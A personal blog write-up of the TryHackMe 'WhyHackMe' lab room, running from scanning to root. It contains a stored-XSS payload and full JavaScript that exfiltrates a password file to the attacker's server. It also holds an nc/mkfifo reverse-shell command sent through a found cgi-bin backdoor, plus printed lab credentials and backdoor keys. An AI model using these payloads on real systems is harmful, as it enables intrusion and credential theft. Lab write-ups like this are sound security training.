---
title: "TryHackMe: WhyHackMe"
author: cilgin
date: 2025-07-10 13:56:25 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-07-10-TryHackMe-WhyHackMe/main.webp
---

Hi I'm making [TryHackMe WhyHackMe](https://tryhackme.com/room/whyhackme) room.

---

```bash
IP=10.10.157.184
```

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-10 14:00 +0300
Nmap scan report for 10.10.157.184
Host is up (0.070s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.21.206.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
41312/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.77 seconds
```

Lets firstly go to the website.

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo1.webp){: width="972" height="589" }

Looks like very simple php website.

Looking throught website I found some login endpotint `/login.php`

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo2.webp){: width="972" height="589" }

admin admin didn't worked lets firstly fuzz the website using `gobuster`.

```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.157.184/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              py,css,txt,bak,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.157.184/assets/]
/blog.php             (Status: 200) [Size: 3102]
/cgi-bin/             (Status: 403) [Size: 277]
/config.php           (Status: 200) [Size: 0]
/dir                  (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 563]
/login.php            (Status: 200) [Size: 523]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 643]
/server-status        (Status: 403) [Size: 277]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

And I found register.php so lets register a account first and try to log in.

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo3.webp){: width="972" height="589" }

I logged in but thats it i think.

It says that now we can comment on posts.

Maybe we can try to exploit that.

Firstly lets log in Anonymous on ftp.

```bash
root@e3769c930fc5:/data# ftp 10.10.157.184 21
Connected to 10.10.157.184.
220 (vsFTPd 3.0.3)
Name (10.10.157.184:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53253|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||5144|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Mar 14  2023 .
drwxr-xr-x    2 0        119          4096 Mar 14  2023 ..
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
```

Lets download update.txt

```bash
ftp> get update.txt
```

```bash
❯ cat update.txt
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.
- admin
```

Now lets continue trying to xss vuln.

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo4.webp){: width="972" height="589" }

It looks like this is not working lets try creating a user named xss vuln.

And It works.

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo5.webp){: width="972" height="589" }

Now lets use this vuln to get the /dir/pass.txt

Now firstly open a username named

`<script src="http://10.21.206.128/pwn.js"></script>`

Here is the code I used:

[TrustedSec | Simple Data Exfiltration Through XSS](https://trustedsec.com/blog/simple-data-exfiltration-through-xss)

```javascript
// TrustedSec Proof-of-Concept to steal
// sensitive data through XSS payload
function read_body(xhr) {
  var data;
  if (!xhr.responseType || xhr.responseType === "text") {
    data = xhr.responseText;
  } else if (xhr.responseType === "document") {
    data = xhr.responseXML;
  } else if (xhr.responseType === "json") {
    data = xhr.responseJSON;
  } else {
    data = xhr.response;
  }
  return data;
}

function stealData() {
  var uri = "/dir/pass.txt";

  xhr = new XMLHttpRequest();
  xhr.open("GET", uri, true);
  xhr.send(null);

  xhr.onreadystatechange = function () {
    if (xhr.readyState == XMLHttpRequest.DONE) {
      // We have the response back with the data
      var dataResponse = read_body(xhr);

      // Time to exfiltrate the HTML response with the data
      var exfilChunkSize = 2000;
      var exfilData = btoa(dataResponse);
      var numFullChunks = (exfilData.length / exfilChunkSize) | 0;
      var remainderBits = exfilData.length % exfilChunkSize;

      // Exfil the yummies
      for (i = 0; i < numFullChunks; i++) {
        console.log("Loop is: " + i);

        var exfilChunk = exfilData.slice(
          exfilChunkSize * i,
          exfilChunkSize * (i + 1)
        );

        // Let's use an external image load to get our data out
        // The file name we request will be the data we're exfiltrating
        var downloadImage = new Image();
        downloadImage.onload = function () {
          image.src = this.src;
        };

        // Try to async load the image, whose name is the string of data
        downloadImage.src =
          "http://10.21.206.128/exfil/" + i + "/" + exfilChunk + ".jpg";
      }

      // Now grab that last bit
      var exfilChunk = exfilData.slice(
        exfilChunkSize * numFullChunks,
        exfilChunkSize * numFullChunks + remainderBits
      );
      var downloadImage = new Image();
      downloadImage.onload = function () {
        image.src = this.src;
      };

      downloadImage.src =
        "http://10.21.206.128/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
      console.log("Done exfiling chunks..");
    }
  };
}

stealData();
```

Now serve this code using a webserver.

```bash
❯ sudo python -m http.server 80
```
And you'll get the password base64 encoded after sending a new comment.


```text
10.10.157.184 - - [10/Jul/2025 15:30:03] "GET /pwn.js HTTP/1.1" 200 -
10.10.157.184 - - [10/Jul/2025 15:30:03] code 404, message File not found
10.10.157.184 - - [10/Jul/2025 15:30:03] "GET /exfil/LAST/**************GFzc3dvcmRTb1N0cm9uZ0lESwo=.jpg HTTP/1.1" 404 -
```

decode the base64 and you'll get the jacks password

use that password to log in with ssh as jack.
```bash
❯ ssh jack@$IP                 
The authenticity of host '10.10.157.184 (10.10.157.184)' can't be established.
ED25519 key fingerprint is SHA256:4vHbB54RGaVtO3RXlzRq50QWtP3O7aQcnFQiVMyKot0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.157.184' (ED25519) to the list of known hosts.
jack@10.10.157.184's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 10 Jul 2025 12:33:12 PM UTC

  System load:  0.0                Processes:             130
  Usage of /:   79.7% of 11.21GB   Users logged in:       0
  Memory usage: 32%                IPv4 address for eth0: 10.10.157.184
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

64 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jan 29 13:44:19 2024
jack@ubuntu:~$ 
```


```bash
jack@ubuntu:~$ ls
user.txt
jack@ubuntu:~$ cat user.txt 
*******************************
```

```bash
jack@ubuntu:/home$ service --status-all
 [ - ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ - ]  grub-common
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ - ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ - ]  lvm2-lvmpolld
 [ + ]  multipath-tools
 [ + ]  mysql
 [ + ]  netfilter-persistent
 [ - ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd
 [ + ]  vsftpd
 [ - ]  x11-common
```

lets log in mysql service.


runnning linpeas I found this.


```text
/var/www/html/config.php:$password = "MysqlPasswordIsPrettyStrong";
```


```bash
jack@ubuntu:/home$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 62
Server version: 10.3.38-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```


I searched the database little bit but found nothing good.


```bash
jack@ubuntu:~$ sudo -l
[sudo] password for jack: 
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```


```bash
jack@ubuntu:/opt$ ls -la
total 40
drwxr-xr-x  2 root root  4096 Aug 16  2023 .
drwxr-xr-x 19 root root  4096 Mar 14  2023 ..
-rw-r--r--  1 root root 27247 Aug 16  2023 capture.pcap
-rw-r--r--  1 root root   388 Aug 16  2023 urgent.txt
jack@ubuntu:/opt$ cat urgent.txt 
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
```

Found these too.

We can use this backdoor to gain root.


```bash
jack@ubuntu:/tmp$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere            
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere            
jack@ubuntu:/tmp$ curl localhost:41312
^C
jack@ubuntu:/tmp$ sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT
jack@ubuntu:/tmp$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere            
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere            
jack@ubuntu:/tmp$ curl localhost:41312
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
 Instead use the HTTPS scheme to access this URL, please.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at www.example.com Port 80</address>
</body></html>
```


Lets try that

```bash
❯ curl -k https://$IP:41312/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.157.184 Port 41312</address>
</body></html>
```



```bash
❯ sftp jack@$IP                
jack@10.10.157.184's password: 
Connected to 10.10.157.184.
sftp> ls
user.txt  
sftp> cd /opt
sftp> ls
capture.pcap  urgent.txt    
sftp> get capture.pcap 
Fetching /opt/capture.pcap to capture.pcap
capture.pcap                                     
```


I used wireshark to see the traffic but it's encypted lets get the encyption keys.



```bash
❯ sftp jack@$IP
jack@10.10.157.184's password: 
Connected to 10.10.157.184.
sftp> cd /etc/apache2/certs/
sftp> ls
apache-certificate.crt    apache.key                
sftp> get apache.key 
Fetching /etc/apache2/certs/apache.key to apache.key
apache.key                              
```


Using wireshark I decrpyted the pcap file and get the cgi-bin endpoint we can use.



![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo6.webp){: width="972" height="589" }


```bash
❯ curl -k -s 'https://10.10.157.184:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'

<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
<h2>
```

Lets get a simple reverse shell first.


I get my shell from [Online - Reverse Shell Generator](https://www.revshells.com/)


```bash
❯ curl -k -s 'https://10.10.157.184:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
```



Lets quickly upgrade the shell



```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# 
stty raw -echo;fg
reset
```

```bash
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

And we got root.



```bash
www-data@ubuntu:/usr/lib/cgi-bin$ sudo bash
root@ubuntu:/usr/lib/cgi-bin# ls
5UP3r53Cr37.py
root@ubuntu:/usr/lib/cgi-bin# cd
root@ubuntu:~# ls
bot.py  root.txt  snap  ssh.sh
root@ubuntu:~# cat root.txt 
*******************************
```


Thanks
